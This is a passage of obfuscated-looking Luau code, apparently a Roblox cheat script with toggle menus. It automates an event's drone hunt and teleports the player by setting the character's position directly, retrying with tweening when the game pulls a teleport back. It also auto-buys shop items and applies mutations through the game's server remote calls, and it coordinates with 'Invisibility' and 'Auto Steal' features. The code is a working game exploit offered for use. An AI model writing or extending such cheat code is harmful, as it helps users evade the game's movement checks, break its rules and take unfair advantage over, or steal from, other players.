				if n23 ~= n22 then
					now2 = nil
					n22 = n23
				end

				if n14 < os.clock() - now then
					tbl215[humanoid3.Id] = os.clock() + 30
					return false
				end
				local position = func325(entry18) or entry18.Position
				local result69 = func279()
				if not result69 then
					return false
				end

				if func288() and not func288(position) then
					func309()
					str28 = "Leaving the base through the safe zone"
					if not func293(position, callback18, 12) then
						return false
					end

					if callback18() then
						return false
					end
				end

				if not value331 then
					local value332 = nil
					local isBasePart = nil

					value331 = function()
						local entry19 = tbl211[humanoid3.Id]
						if not entry19 then
							return nil
						end

						if not value332 or not value332.Parent then
							value332 = func322(humanoid3.Id)
							local hitbox = value332 and value332:FindFirstChild("Hitbox")
							isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or value332 and value332.PrimaryPart or nil
						end

						if isBasePart and isBasePart.Parent then
							return isBasePart.Position
						end
						return entry19.Position
					end
				end

				if flag360 then
					func329(position + Vector3.new(0, -1, 16), position, value331)
				else
					func329(position + Vector3.new(0, -1, 5), position)
				end

				if (result69.Position - position).Magnitude <= 60 and not flag360 then
					func334()
				end

				local magnitude = (result69.Position - position).Magnitude
				local flag396 = false

				if flag360 then
					flag396 = math.max(12, n11 + 7)
				end

				local flag397 = magnitude <= (flag396 or 12)

				if flag397 then
					if flag360 then
						list39.SpamUntil = os.clock() + 0.2
					end

					now2 = now2 or os.clock()
					if os.clock() - now2 > 8 then
						tbl215[humanoid3.Id] = os.clock() + 30
						return false
					end
					local flag398 = false

					if flag360 then
						flag398 = func338()
					end

					if flag398 or not flag360 and func335() then
						str28 = string.format("Smashing %s  %d HP", entry18.Tier ~= "" and entry18.Tier or "drone", math.max(0, tonumber(entry18.Health) or 0))
					elseif not flag393 then
						str28 = "No bat found, get any bat to smash drones"
						flag393 = true
					end
				else
					str28 = "Flying to a drone"
				end

				local wait = task.wait
				local flag399 = false

				if not flag360 then
					flag397 = flag399
				end

				wait(flag397 and 0.03 or 0.1)
			end

			return false
		end

		local function func341(callback19)
			for _, item100 in ipairs(tbl214) do
				if callback19() then
					return false
				end
				str28 = "Looking for drones"
				func329(item100)
				local n22 = os.clock() + 12

				while os.clock() < n22 and not callback19() do
					func308()
					if #func326() > 0 then
						return true
					end

					if str1.DistanceTo(item100) < 8 then
						break
					end
					task.wait(0.2)
				end
			end

			return #func326() > 0
		end

		local function func342()
			local serverTimeNow = workspace:GetServerTimeNow()
			local flag400, flag401 = func275()
			if flag400 and flag401 and flag401 < 25 then
				return next(tbl212) ~= nil
			end

			for _, value333 in pairs(tbl212) do
				local kind2 = value333.Kind == "Part"
				local flag402

				if kind2 then
					flag402 = kind2
				else
					flag402 = value333.ExpiresAt and value333.ExpiresAt - serverTimeNow < 30
				end

				if flag402 then
					return true
				end
			end

			return false
		end

		local value334 = nil

		local function func343()
			local window = type(snapshot) == "table" and snapshot.Window or nil
			return type(window) == "table" and window.Index or nil
		end

		local function func344(callback20)
			local flag403 = value334 ~= nil and value334 == func343()

			while not callback20() do
				RunService.Heartbeat:Wait()

				if not callback20() then
					func308()

					if func342() then
						func339(callback20)
					end

					local flag404, flag405, flag406, flag407, flag408, position, flag409, magnitude, flag410, flag411, flag412, vector, flag413, n22, n23, value335, n24, flag414, flag415, flag416

					if func288() then
						func309()

						if func290(callback20) then
							flag404 = func327()
							flag405 = not flag404 and next(tbl212) ~= nil

							if flag405 then
								func339(callback20)
								func308()
								flag404 = func327()
							end

							if not flag404 then
								flag406 = not func275()
								flag407 = flag406 or flag403

								if not flag407 then
									value334 = func343()
									flag408 = true
									flag403 = true

									if not func341(callback20) then
										break
									else
										continue
									end
								end
							else
								position = func325(flag404) or flag404.Position
								flag409 = func279()
								magnitude = flag409 and (flag409.Position - position).Magnitude or 0
								flag410 = flag378 == "Teleport"
								flag409 = flag410 and flag409

								if flag409 then
									flag411 = func288() and not func288(position)
									flag409 = not flag411
								end

								if flag409 then
									flag412 = magnitude > n13 and magnitude <= n16 and os.clock() >= n18 and os.clock() - n19 >= n17

									if flag412 then
										n19 = os.clock()
										vector = Vector3.new
										flag413 = false

										if flag360 then
											flag413 = 16
										end

										n22 = flag413 or 5
										n23 = position + vector(0, -1, n22)
										func329(n23, position)
										value335 = func279()

										if value335 then
											str28 = "Teleporting to the next drone"

											pcall(function()
												value335.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
												value335.AssemblyLinearVelocity = Vector3.zero
												value335.AssemblyAngularVelocity = Vector3.zero
											end)

											n24 = os.clock() + 0.8

											while true do
												flag414 = os.clock() < n24
												flag415 = flag414 and not callback20()

												if flag415 then
													flag416 = func279()
													flag416 = flag416 and (flag416.Position - n23).Magnitude > 40

													if flag416 then
														n18 = os.clock() + 30
														str28 = "Teleport pulled back, tweening"
														break
													else
														RunService.Heartbeat:Wait()
														continue
													end
												end

												break
											end
										end
									end
								end

								func340(flag404, callback20)
								continue
							end
						end
					else
						flag404 = func327()
						flag405 = not flag404 and next(tbl212) ~= nil

						if flag405 then
							func339(callback20)
							func308()
							flag404 = func327()
						end

						if not flag404 then
							flag406 = not func275()
							flag407 = flag406 or flag403

							if not flag407 then
								value334 = func343()
								flag408 = true
								flag403 = true

								if not func341(callback20) then
									break
								else
									continue
								end
							end
						else
							position = func325(flag404) or flag404.Position
							flag409 = func279()
							magnitude = flag409 and (flag409.Position - position).Magnitude or 0
							flag410 = flag378 == "Teleport"
							flag409 = flag410 and flag409

							if flag409 then
								flag411 = func288() and not func288(position)
								flag409 = not flag411
							end

							if flag409 then
								flag412 = magnitude > n13 and magnitude <= n16 and os.clock() >= n18 and os.clock() - n19 >= n17

								if flag412 then
									n19 = os.clock()
									vector = Vector3.new
									flag413 = false

									if flag360 then
										flag413 = 16
									end

									n22 = flag413 or 5
									n23 = position + vector(0, -1, n22)
									func329(n23, position)
									value335 = func279()

									if value335 then
										str28 = "Teleporting to the next drone"

										pcall(function()
											value335.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
											value335.AssemblyLinearVelocity = Vector3.zero
											value335.AssemblyAngularVelocity = Vector3.zero
										end)

										n24 = os.clock() + 0.8

										while true do
											flag414 = os.clock() < n24
											flag415 = flag414 and not callback20()

											if flag415 then
												flag416 = func279()
												flag416 = flag416 and (flag416.Position - n23).Magnitude > 40

												if flag416 then
													n18 = os.clock() + 30
													str28 = "Teleport pulled back, tweening"
													break
												else
													RunService.Heartbeat:Wait()
													continue
												end
											end

											break
										end
									end
								end
							end

							func340(flag404, callback20)
							continue
						end
					end
				end

				break
			end

			func339(callback20)
			func309()
		end

		local tbl222 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

		str1.ScrambleLostPart = function(param198)
			return func276(func273(), param198)
		end

		value282 = nil

		func310 = function()
			local result70 = func273()
			if not result70 then
				return "Lost Parts: no event data"
			end
			local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
			local list43 = {}
			local n22 = 0
			local n23 = 0

			for _, item101 in ipairs(list37) do
				local value336 = drScrambleEvent and drScrambleEvent:FindFirstChild(item101)

				if value336 then
					n22 += 1
				end

				if func276(result70, item101) then
					n23 += 1
				elseif value336 then
					local ok, result = pcall(value336.GetPivot, value336)
					local flag417 = ok and str1.DistanceTo(result.Position) or nil
					list43[#list43 + 1] = flag417 and string.format("%s %d studs", tbl222[item101], math.floor(flag417)) or tbl222[item101]
				else
					list43[#list43 + 1] = tbl222[item101] .. " not on map"
				end
			end

			local formatted13 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n22, n23)

			if #list43 > 0 then
				formatted13 ..= "  -  " .. table.concat(list43, "  -  ")
			end

			return formatted13
		end

		local function func345(callback21)
			if not func284() then
				return true
			end
			local Exit = func282("Exit")
			local flag418 = func283(Exit, nil)
			if not flag418 then
				return false
			end
			str28 = "Leaving the Secret Cave"
			if not func280(flag418, callback21, 4) then
				return false
			end

			for i = 1, 4 do
				if callback21() then
					return false
				end
				func281(Exit or func282("Exit"))
				local n22 = os.clock() + 1.5

				while os.clock() < n22 and func284() do
					RunService.Heartbeat:Wait()
				end

				if not func284() then
					return true
				end
			end

			return not func284()
		end

		local function func346()
			return str1.IsNight() or str1.WallSealed()
		end

		local function func347(callback22)
			if not func346() then
				return true
			end
			func309()

			while func346() and not callback22() do
				str28 = str1.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
				RunService.Heartbeat:Wait()
			end

			return not callback22()
		end

		func311 = function()
			if not str1.Toggle(nil, false) or not func274() then
				return false
			end

			if flag361.Ended then
				return false
			end

			if func275() then
				return true
			end
			func308()
			return #func326() > 0 or next(tbl212) ~= nil
		end

		func312 = function()
			local result71 = func273()
			if not result71 or result71.Completed == true or not func274() then
				return false
			end
			local totalParts2 = tonumber(result71.TotalParts)

			if not totalParts2 then
				totalParts2 = func277(result71) + (tonumber(result71.DroneParts) or 0)
			end

			local flag419 = str1.Toggle(nil, false)

			if flag419 then
				local n22 = #list37
				flag419 = func277(result71) < n22
			end

			local flag420 = str1.Toggle(nil, false) and (totalParts2 >= 5 or result71.Discovered ~= true)
			return flag419 or flag420
		end

		func313 = function(flag421)
			local function func348()
				return flag421 ~= n9 or str1.Movement.Owner ~= "scramble"
			end

			local function func349()
				return func348() or not func311() or func346()
			end

			while true do
				if func311() and not func348() then
					if func347(func348) then
						pcall(func344, func349)
						if func346() then
							continue
						end
					end
				end

				break
			end

			func309()
			if func348() or func311() then
				return
			end

			if not func312() then
				func294(func348)
				str28 = ""
				return
			end

			if not func347(func348) then
				return
			end
			scrambleRead(true)
			local result72 = func273()
			if not result72 then
				return
			end

			if not func312() then
				str28 = ""
				return
			end

			if str1.Toggle(nil, false) and result72.Discovered ~= true then
				pcall(func297, func348)
			end

			if str1.Toggle(nil, false) then
				pcall(func298, function()
					return func348() or not str1.Toggle(nil, false) or func311() or func346()
				end)
			end

			if str1.Toggle(nil, false) then
				pcall(func299, function()
					return func348() or not str1.Toggle(nil, false) or func311() or func346()
				end)
			end

			if func284() and not func348() then
				pcall(func345, func348)
			end

			if not func284() and not func311() then
				pcall(func294, func348)
			end
		end
	end

	local func350

	func350 = function(callback23)
		if not (str1.Treadmill.Riding or str1.OnBelt()) then
			return true
		end

		for i = 1, 3 do
			if callback23() then
				return false
			end
			str28 = "Jumping off the treadmill"
			str1.Treadmill.Riding = false
			task.spawn(str1.LeaveBelt)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Sit = false
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			local result73 = func279()

			if result73 then
				local position = result73.Position
				local n20 = position + Vector3.new(0, 18, 0)
				local now = os.clock()

				while true do
					RunService.Heartbeat:Wait()
					local result74 = func279()

					if not result74 then
						break
					else
						local n21 = math.min(1, (os.clock() - now) / 0.25)

						pcall(function()
							local rotation = result74.CFrame.Rotation
							result74.CFrame = CFrame.new(position:Lerp(n20, n21)) * rotation
							result74.AssemblyLinearVelocity = Vector3.zero
							result74.AssemblyAngularVelocity = Vector3.zero
						end)

						if not (n21 >= 1) then
							continue
						end
						break
					end
				end
			end

			if not (str1.Treadmill.Riding or str1.OnBelt()) then
				return true
			end
		end

		return not str1.OnBelt()
	end

	tbl213.Handle = obj3:CreateToggle({
		Name = "Auto Buy Scramble Shop",
		Note = "Buy the picked items with Samples",
		Default = false,
		Callback = function()
			n12 = 0
			tbl2.Wake()
		end,
	})

	func6(obj3:CreateMultiDropdown({
		Name = "Scramble Shop Items",
		Options = list38,
		Default = { "Scrambled Mutation" },
		SubOf = tbl213.Handle,
		Callback = function(value)
			local picked = {}

			if type(value) == "table" then
				for k, value337 in pairs(value) do
					if value337 == true and type(k) == "string" then
						picked[k] = true
					elseif type(value337) == "string" then
						picked[value337] = true
					end
				end
			end

			tbl213.Picked = picked
		end,
	}))

	obj3:CreateSlider({
		Name = "Keep Samples",
		Note = "Never spend below this many Samples",
		Min = 0,
		Max = 10000,
		Default = 0,
		Increment = 25,
		Unit = "",
		SubOf = tbl213.Handle,
		Callback = function(value)
			tbl213.Keep = math.max(0, tonumber(value) or 0)
		end,
	})

	do
		local tbl223 = { "Highest Value", "Best Rarity", "Biggest Size" }
		local tbl224 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }
		local n20 = 6

		local tbl225 = {
			Handle = nil,
			BuyHandle = nil,
			Loop = 0,
			MinRarity = 0,
			MinIncome = 0,
			Priority = tbl223[1],
			SkipMutated = true,
			Targets = {},
			Cooldown = 0,
			Status = "Idle",
			State = "idle",
			Detail = "Turn it on to start applying Scrambled",
			RarityColor = "#FFFFFF",
			Icon = "",
			Ui = {},
			Row = nil,
			Left = 0,
			Pen = 0,
			Match = 0,
			Tries = 0,
			Hits = 0,
			Locked = nil,
			Short = false,
			EggOptions = {},
			EggCategory = {},
		}

		local directory = tbl1.Assets and tbl1.Assets.Directory
		local tbl226 = {}

		if type(directory) == "table" then
			for k, value338 in pairs(directory) do
				local rarity = type(value338) == "table" and value338.Rarity or nil
				local flag422 = type(rarity) == "table"

				if flag422 then
					flag422 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				flag422 = flag422 or nil

				if flag422 then
					table.insert(tbl226, {
						Category = tostring(k),
						Name = tostring(value338.DisplayName or k),
						Rarity = flag422,
						RarityName = tostring(rarity.DisplayName or rarity._id or flag422),
					})
				end
			end
		end

		table.sort(tbl226, function(param199, param200)
			if param199.Rarity ~= param200.Rarity then
				return param199.Rarity > param200.Rarity
			end
			return param199.Name < param200.Name
		end)

		for _, item102 in ipairs(tbl226) do
			local formatted14 = string.format("%s [%s]", item102.Name, item102.RarityName)

			if tbl225.EggCategory[formatted14] then
				formatted14 = string.format("%s [%s] (%s)", item102.Name, item102.RarityName, item102.Category)
			end

			table.insert(tbl225.EggOptions, formatted14)
			tbl225.EggCategory[formatted14] = item102.Category
		end

		local function func351(param201)
			local directory2 = tbl1.Assets and tbl1.Assets.Directory
			return type(directory2) == "table" and directory2[tostring(param201)] or nil
		end

		local function func352(param202)
			local assetCategory12 = func351(param202.AssetCategory)
			local rarity = type(assetCategory12) == "table" and assetCategory12.Rarity or nil
			local flag423 = type(rarity) == "table"

			if flag423 then
				flag423 = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			return flag423 or 0
		end

		local function func353(param203)
			local assetCategory13 = func351(param203.AssetCategory)
			local n21 = type(assetCategory13) == "table" and tonumber(assetCategory13.EarningRate) or 0
			local n22 = tonumber(param203.AssetScale) or 0
			if n21 <= 0 or n22 <= 0 then
				return 0
			end
			return n21 * (n22 > 5 and (n22 / 5) ^ 1.2 * 19.637875755794113 or n22 ^ 1.85)
		end

		local function func354(list44)
			if tostring(list44.BaseMutation or "") == "Scrambled" then
				return true
			end

			if type(list44.Mutations) == "table" then
				for k, mutation in pairs(list44.Mutations) do
					if type(mutation) == "string" and mutation == "Scrambled" then
						return true
					end

					if type(k) == "string" and k == "Scrambled" and mutation ~= false then
						return true
					end
				end
			end

			return false
		end

		local function func355()
			local eggState = tbl1.EggState
			if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
				return {}
			end
			local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
			if not ok or type(result) ~= "table" then
				return {}
			end
			local list45 = {}

			for k, value339 in pairs(result) do
				if type(value339) == "table" and value339.Placement ~= nil then
					value339.Uid = value339.Uid or k
					list45[#list45 + 1] = value339
				end
			end

			return list45
		end

		local function func356(childName13)
			childName13 = childName13 and childName13.Uid

			if childName13 then
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local obj47 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(childName13)

				if obj47 then
					local ok, result = pcall(function()
						return obj47:GetPivot().Position
					end)

					if ok and typeof(result) == "Vector3" then
						return result
					end
				end
			end

			if type(str1.PenAnchor) == "function" then
				local ok, result = pcall(str1.PenAnchor)
				if ok and typeof(result) == "Vector3" then
					return result
				end
			end

			return nil
		end

		local function func357(param204, flag424)
			local num94 = func356(param204)
			if num94 == nil then
				return true
			end

			if str1.DistanceTo(num94) <= n20 then
				return true
			end

			local function func358()
				if flag424 ~= tbl225.Loop or not str1.Toggle(tbl225.Handle, false) then
					return true
				end

				if str1.Movement.PlaceWanted == true then
					return true
				end
				return str1.Movement.ScrambleWanted == true or str1.Steal.Wanted == true
			end

			if str1.Treadmill.Riding or str1.OnBelt() then
				str1.ExitBelt()
			end

			str1.HoldBelt()
			local ok, result = pcall(str1.FlyTo, num94 + Vector3.new(0, 3, 0), func358, "mutation")
			str1.ReleaseBelt()
			str1.LeaveBelt()
			result = ok and result

			if result then
				local n21 = n20 + 4
				result = str1.DistanceTo(num94) <= n21
			end

			return result
		end

		local func359 = func303

		local function func360(obj48)
			if not obj48 then
				return 0
			end
			local num95 = tonumber(obj48:GetAttribute("Uses"))
			if num95 ~= nil then
				return num95
			end
			local matched = string.match(obj48.Name, "%[X(%d+)%]")
			return tonumber(matched) or 1
		end

		local function func361()
			local result75 = func359()
			if not result75 then
				return nil, 0
			end
			local value340 = func360(result75)
			if value340 <= 0 then
				return nil, 0
			end
			return result75, value340
		end

		tbl225.Grip = function(obj)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")
			if not character or not humanoid or not obj or obj.Parent == nil then
				return false
			end

			if obj.Parent ~= character then
				pcall(function()
					humanoid:EquipTool(obj)
				end)

				if obj.Parent ~= character then
					pcall(function()
						obj.Parent = character
					end)
				end

				task.wait(0.2)
			end

			return obj.Parent == character
		end

		local function func362()
			if not str1.Toggle(tbl225.BuyHandle, false) or flag362 then
				return false
			end
			flag362 = true
			local flag425 = false

			local ok, result = pcall(function()
				flag425 = tbl225.Purchase()
			end)

			flag362 = false

			if not ok then
				tbl225.Status = "Buy failed: " .. tostring(result)
			end

			return flag425
		end

		tbl225.Purchase = function()
			local n21 = 0
			local short = false

			for i = 1, 10 do
				local flag426 = n21 == 0 and scrambleRead(true) or snapshot
				local result76 = func273()

				if not (type(flag426) ~= "table" or type(result76) ~= "table") then
					local value341, value342, value343 = ipairs(type(flag426.Shop) == "table" and flag426.Shop or {})
					local value344 = nil

					for _, value345 in value341, value342, value343 do
						if type(value345) == "table" and value345.Id == "MutationConsumable" then
							value344 = value345
						end
					end

					if value344 then
						local purchaseLimit2 = tonumber(value344.PurchaseLimit)

						if not (purchaseLimit2 and func305(result76, value344) >= purchaseLimit2) then
							local huge = tonumber(value344.Price) or math.huge

							if (tonumber(result76.Samples) or 0) - huge < tbl213.Keep then
								short = true

								if n21 == 0 then
									tbl225.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
								end

								break
							else
								local Shop = scrambleRequest("Shop", value344.Id, { Quote = value344.Quote, Sequence = tonumber(result76.ShopSequence) or 0 })

								if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
									n21 += 1
									task.wait(0.4)
									continue
								end
							end
						end
					end
				end

				break
			end

			if n21 > 0 then
				tbl225.Status = string.format("Bought %d Scrambled", n21)
				tbl225.Short = short
				return true
			end

			tbl225.Short = short
			return false
		end

		local function func363()
			local pen = 0
			local match = 0
			local n21 = -1
			local value346 = nil

			for _, item103 in ipairs(func355()) do
				pen += 1
				local skipMutated = tbl225.SkipMutated and func354(item103)
				local flag427 = false

				if skipMutated then
					flag427 = true
				end

				local flag428 = not flag427
				local flag429

				if flag428 then
					local minRarity = tbl225.MinRarity
					flag429 = func352(item103) < minRarity
				else
					flag429 = flag428
				end

				if flag429 then
					flag427 = true
				end

				local flag430 = not flag427 and tbl225.MinIncome > 0

				if flag430 then
					local minIncome = tbl225.MinIncome
					flag430 = func353(item103) < minIncome
				end

				if flag430 then
					flag427 = true
				end

				if not flag427 and next(tbl225.Targets) ~= nil and tbl225.Targets[tostring(item103.AssetCategory)] ~= true then
					flag427 = true
				end

				if not flag427 then
					match += 1
					local n22

					if tbl225.Priority == tbl223[2] then
						n22 = func352(item103) * 1000 + (tonumber(item103.AssetScale) or 0)
					elseif tbl225.Priority == tbl223[3] then
						n22 = tonumber(item103.AssetScale) or 0
					else
						n22 = func353(item103)
					end

					local flag431 = n22 > n21

					if not flag431 and value346 ~= nil and n22 == n21 and item103.Uid == tbl225.Locked then
						n21 = n22
						value346 = item103
					elseif flag431 then
						n21 = n22
						value346 = item103
					end
				end
			end

			local value347 = tbl225
			tbl225.Pen = pen
			value347.Match = match
			return value346
		end

		local function func364(param205)
			if typeof(param205) ~= "Color3" then
				return "#FFFFFF"
			end
			local floor = math.floor
			local n21 = param205.B * 255 + 0.5
			return string.format("#%02X%02X%02X", math.floor(param205.R * 255 + 0.5), math.floor(param205.G * 255 + 0.5), floor(n21))
		end

		local function func365(param206)
			local ok, result = pcall(Color3.fromHex, param206)
			if not ok or typeof(result) ~= "Color3" then
				return param206
			end
			local value348, value349, value350 = result:ToHSV()
			return func364(Color3.fromHSV(value348, math.min(value349, 0.78), math.max(value350, 0.82)))
		end

		local function func366(flag432)
			local value351 = func351(flag432 and flag432.AssetCategory)
			local icon = type(value351) == "table" and value351.Icon or nil
			if icon == nil then
				return ""
			end

			if tonumber(icon) then
				return "rbxassetid://" .. tostring(icon)
			end
			return tostring(icon)
		end

		local function func367(flag433)
			local value352 = func351(flag433 and flag433.AssetCategory)
			local rarity = type(value352) == "table" and value352.Rarity or nil
			local flag434 = type(rarity) == "table"

			if flag434 then
				flag434 = tostring(rarity.DisplayName or rarity._id or "")
			end

			flag434 = flag434 or ""
			local packed2 = table.pack(func365(func364(type(rarity) == "table" and rarity.Color or nil)))
			return flag434, table.unpack(packed2, 1, packed2.n)
		end

		local function func368(param207)
			if type(param207) ~= "table" then
				return "No egg selected"
			end
			local assetCategory14 = func351(param207.AssetCategory)
			local flag435 = type(assetCategory14) == "table"

			if flag435 then
				flag435 = tostring(assetCategory14.DisplayName or param207.AssetCategory)
			end

			return flag435 or tostring(param207.AssetCategory)
		end

		local function func369()
			local idle = tbl224[tbl225.State] or tbl224.idle

			if tbl225.Ui.Accent and type(tbl225.Ui.Accent.Set) == "function" then
				tbl225.Ui.Accent.Set({ Background = idle })
			end

			if tbl225.Ui.Title and type(tbl225.Ui.Title.Set) == "function" then
				tbl225.Ui.Title.Set({ Text = tbl225.Status, Color = idle })
			end

			if tbl225.Ui.Egg and type(tbl225.Ui.Egg.Set) == "function" then
				tbl225.Ui.Egg.Set({ Text = tbl225.Detail, Color = tbl225.RarityColor })
			end

			if tbl225.Ui.Meta and type(tbl225.Ui.Meta.Set) == "function" then
				tbl225.Ui.Meta.Set({
					Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl225.Left, tbl225.Match, tbl225.Pen, tbl225.Tries, tbl225.Hits),
				})
			end

			if tbl225.Ui.Icon and type(tbl225.Ui.Icon.Set) == "function" then
				tbl225.Ui.Icon.Set({ Visible = tbl225.Icon ~= "", Image = tbl225.Icon, StrokeColor = tbl225.RarityColor })
			end

			if tbl225.Row and type(tbl225.Row.Set) == "function" then
				pcall(tbl225.Row.Set, tbl225.Row, tbl225.Status .. "  -  " .. tbl225.Detail)
			end
		end

		local function func370(param208)
			if type(param208) ~= "table" then
				tbl225.Detail = "No egg matches the filters"
				tbl225.RarityColor = "#C7CBD6"
				tbl225.Icon = ""
				return
			end

			local flag436, value353 = func367(param208)
			local n21 = tonumber(param208.AssetScale) or 0
			tbl225.Detail = string.format("%s   %.2f kg", func368(param208), n21)

			if flag436 ~= "" then
				tbl225.Detail = tbl225.Detail .. "   " .. string.upper(flag436)
			end

			tbl225.RarityColor = value353
			tbl225.Icon = func366(param208)
		end

		tbl225.Apply = function(obj, param209)
			if not tbl225.Grip(param209) then
				tbl225.State = "work"
				tbl225.Status = "Could not hold Scrambled"
				tbl225.Cooldown = os.clock() + 2
				return false
			end

			local packages = ReplicatedStorage:FindFirstChild("Packages")
			packages = packages and packages:FindFirstChild("Networking")
			local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

			if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
				tbl225.State = "stop"
				tbl225.Status = "Mutation remote is missing"
				tbl225.Cooldown = os.clock() + 10
				return false
			end

			tbl225.State = "work"
			tbl225.Status = "Applying Scrambled"
			tbl225.Tries = tbl225.Tries + 1

			local ok, result = pcall(function()
				return rfBossMasteryAskUseMutationConsu:InvokeServer(obj.Uid)
			end)

			if not ok or type(result) ~= "table" then
				tbl225.Cooldown = os.clock() + 10
				return false
			end

			if result.Success == true then
				tbl225.Status = "Scrambled applied"
				tbl225.Locked = nil
				tbl225.State = "good"
				tbl225.Hits = tbl225.Hits + 1
				return true
			end

			local str34 = tostring(result.Message or "")
			local lowered4 = string.lower(str34)
			tbl225.Status = str34 ~= "" and str34 or "Try failed"
			tbl225.State = "work"

			if string.find(lowered4, "not found") or string.find(lowered4, "invalid") then
				tbl225.Locked = nil
				tbl225.Cooldown = os.clock() + 3
				return false
			end

			return true
		end

		tbl225.Settle = function()
			local n21 = os.clock() + 3

			while os.clock() < n21 do
				if str1.Grounded() then
					return
				end
				RunService.Heartbeat:Wait()
			end
		end

		tbl225.Over = function(flag437)
			if flag437 ~= tbl225.Loop or not str1.Toggle(tbl225.Handle, false) then
				return true
			end

			if str1.Movement.PlaceWanted == true then
				return true
			end

			if type(str1.MechFirst) == "function" and str1.MechFirst() then
				return true
			end
			return str1.Movement.ScrambleWanted == true or str1.Steal.Wanted == true
		end

		tbl225.Idle = function(status, detail, flag438)
			tbl225.State = "idle"
			tbl225.Status = status
			tbl225.Left = 0
			tbl225.Detail = detail
			tbl225.RarityColor = "#C7CBD6"
			tbl225.Icon = ""
			tbl225.Cooldown = os.clock() + (flag438 or 5)
		end

		tbl225.PauseInvis = function()
			tbl225.InvisResumeAt = nil

			if not str1.InvisMutate then
				str1.InvisMutate = true
				local invisibilityHandle = str1.InvisibilityHandle

				if invisibilityHandle ~= nil and str1.Toggle(invisibilityHandle, false) then
					str1.Notify("Invisibility", "Invisibility is paused while Scrambled is applied and comes back after it.")
				end
			end

			local character = localPlayer.Character
			return not (character and character:GetAttribute("InvisApplied") == true)
		end

		tbl225.ResumeInvis = function(flag439)
			if not str1.InvisMutate then
				return
			end

			if not flag439 then
				tbl225.InvisResumeAt = tbl225.InvisResumeAt or os.clock() + 5
				local invisResumeAt = tbl225.InvisResumeAt
				if os.clock() < invisResumeAt then
					return
				end
			end

			tbl225.InvisResumeAt = nil
			str1.InvisMutate = false
			local invisibilityHandle = str1.InvisibilityHandle

			if invisibilityHandle ~= nil and str1.Toggle(invisibilityHandle, false) then
				str1.Notify("Invisibility", "Scrambled is done, Invisibility is back on.")
			end
		end

		local function func371(param210)
			tbl225.ResumeInvis(false)

			if type(str1.MechFirst) == "function" and str1.MechFirst() then
				tbl225.State = "work"
				tbl225.Status = "Mech boss goes first"
				tbl225.Cooldown = os.clock() + 2
				return
			end

			if str1.Movement.ScrambleWanted == true or str1.Steal.Wanted == true then
				tbl225.State = "work"
				tbl225.Status = str1.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
				tbl225.Cooldown = os.clock() + 2
				return
			end

			local cooldown = tbl225.Cooldown
			if os.clock() < cooldown then
				return
			end
			local flag440, value354 = func361()

			if not flag440 then
				pcall(func363)
				if func362() then
					tbl225.Cooldown = os.clock() + 0.5
					return
				end

				if tbl225.Short then
					tbl225.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
					return
				end

				if not string.find(tbl225.Status, "Samples", 1, true) then
					tbl225.Status = "Need a Scrambled consumable"
				end

				tbl225.Idle(tbl225.Status, "Buy Scrambled from the event shop", 5)
				return
			end

			tbl225.Left = value354
			local result77 = func363()

			if not result77 or not result77.Uid then
				tbl225.State = "stop"
				tbl225.Status = "Waiting"
				func370(nil)
				return
			end

			if str1.Movement.PlaceWanted == true then
				tbl225.State = "work"
				tbl225.Status = "Auto Place goes first"
				tbl225.Cooldown = os.clock() + 2
				return
			end

			if not tbl225.PauseInvis() then
				tbl225.State = "work"
				tbl225.Status = "Leaving Invisibility to hold Scrambled"
				tbl225.Cooldown = os.clock() + 0.5
				return
			end

			if not str1.ClaimMovement("mutation") then
				tbl225.State = "work"
				tbl225.Status = "Waiting for " .. tostring(str1.Movement.Owner or "movement")
				tbl225.Cooldown = os.clock() + 2
				return
			end

			str1.Movement.MutationWanted = true

			local ok, result = pcall(function()
				while not tbl225.Over(param210) do
					local value355, value356 = func361()

					if value355 then
						tbl225.Left = value356
						local result78 = func363()

						if not result78 or not result78.Uid then
							tbl225.State = "stop"
							tbl225.Status = "Waiting"
							func370(nil)
							break
						else
							if result78.Uid ~= tbl225.Locked then
								tbl225.Locked = result78.Uid
								tbl225.Status = "New target picked"
							end

							func370(result78)

							if not func357(result78, param210) then
								tbl225.State = "work"
								tbl225.Status = "Could not reach the egg"
								tbl225.Cooldown = os.clock() + 3
								break
							elseif not tbl225.Over(param210) then
								if tbl225.Apply(result78, value355) then
									pcall(func369)
									task.wait(0.35)
									continue
								end
							end
						end
					end

					break
				end
			end)

			if not ok then
				tbl225.Status = "Stopped: " .. tostring(result)
				tbl225.State = "work"
				tbl225.Cooldown = os.clock() + 3
			end

			tbl225.Settle()
			str1.Movement.MutationWanted = false
			str1.ReleaseMovement("mutation")
			tbl225.InvisResumeAt = os.clock() + 5
		end

		tbl225.Handle = obj3:CreateToggle({
			Name = "Auto Use Scrambled Mutation",
			Default = false,
			Callback = function(value)
				tbl225.Loop = tbl225.Loop + 1
				str1.Movement.MutationWanted = false
				str1.ReleaseMovement("mutation")
				if value ~= true then
